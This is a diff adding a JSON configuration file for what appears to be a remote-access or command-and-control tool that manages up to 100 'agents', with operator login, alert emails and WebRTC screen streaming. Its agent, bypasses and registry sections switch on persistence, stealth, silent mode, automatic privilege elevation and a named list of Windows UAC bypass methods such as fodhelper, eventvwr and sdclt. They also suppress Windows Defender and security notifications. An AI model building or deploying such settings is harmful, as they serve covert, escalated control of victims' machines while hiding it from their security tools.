@@ -1,0 +1,111 @@
+{
+  "server": {
+    "controllerUrl": "http://127.0.0.1:8080",
+    "serverPort": 8080,
+    "sslEnabled": false,
+    "maxAgents": 100,
+    "heartbeatInterval": 30,
+    "commandTimeout": 30,
+    "autoReconnect": true,
+    "backupUrl": ""
+  },
+  "authentication": {
+    "operatorPassword": "",
+    "sessionTimeout": 30,
+    "maxLoginAttempts": 3,
+    "requireTwoFactor": false,
+    "apiKeyEnabled": true,
+    "apiKey": "",
+    "trustedDevices": [],
+    "totpEnrolled": false,
+    "totpSecretEnc": "9a8-vJ1EyVkA7_FfQET_JLGsqqgb6r1j-VNsKbJu9xA=",
+    "totpSalt": "bIQbT6Ng9AvS0eJ2xB63Pg==",
+    "totpCreatedAt": "2026-01-20T20:18:12.336864",
+    "totpFailedAttempts": 0
+  },
+  "email": {
+    "enabled": false,
+    "smtpServer": "smtp.gmail.com",
+    "smtpPort": 587,
+    "username": "",
+    "password": "",
+    "recipient": "",
+    "enableTLS": true,
+    "notifyAgentOnline": true,
+    "notifyAgentOffline": true,
+    "notifyCommandFailure": true,
+    "notifySecurityAlert": true
+  },
+  "agent": {
+    "defaultPersistence": true,
+    "enableUACBypass": true,
+    "enableDefenderDisable": false,
+    "enableAdvancedPersistence": true,
+    "silentMode": true,
+    "quickStartup": false,
+    "enableStealth": true,
+    "autoElevatePrivileges": true,
+    "requestAdminFirst": false,
+    "maxPromptAttempts": 3,
+    "uacBypassDebug": true,
+    "persistentAdminPrompt": false
+  },
+  "bypasses": {
+    "enabled": true,
+    "methods": {
+      "cleanmgr_sagerun": true,
+      "fodhelper": true,
+      "computerdefaults": true,
+      "eventvwr": true,
+      "sdclt": true,
+      "wsreset": true,
+      "slui": true,
+      "winsat": true,
+      "silentcleanup": true,
+      "icmluautil": true
+    }
+  },
+  "registry": {
+    "enabled": true,
+    "notificationsEnabled": true,
+    "actions": {
+      "policy_push_notifications": true,
+      "policy_windows_update": true,
+      "context_runas_cmd": true,
+      "context_powershell_admin": true,
+      "notify_center_hkcu": true,
+      "notify_center_hklm": true,
+      "defender_ux_suppress": true,
+      "toast_global_above_lock": true,
+      "toast_global_critical_above_lock": true,
+      "toast_windows_update": true,
+      "toast_security_maintenance": true,
+      "toast_windows_security": true,
+      "toast_sec_health_ui": true,
+      "explorer_balloon_tips": true,
+      "explorer_info_tip": true
+    }
+  },
+  "webrtc": {
+    "enabled": true,
+    "iceServers": [
+      "stun:stun.l.google.com:19302",
+      "stun:stun1.l.google.com:19302"
+    ],
+    "maxBitrate": 5000000,
+    "adaptiveBitrate": true,
+    "frameDropping": true,
+    "qualityLevel": "auto",
+    "monitoringEnabled": true
+  },
+  "security": {
+    "encryptCommunication": true,
+    "validateCertificates": false,
+    "allowSelfSigned": true,
+    "rateLimitEnabled": true,
+    "rateLimitRequests": 100,
+    "rateLimitWindow": 60,
+    "frontendOrigins": [],
+    "blocked_ips": []
+  }
+}
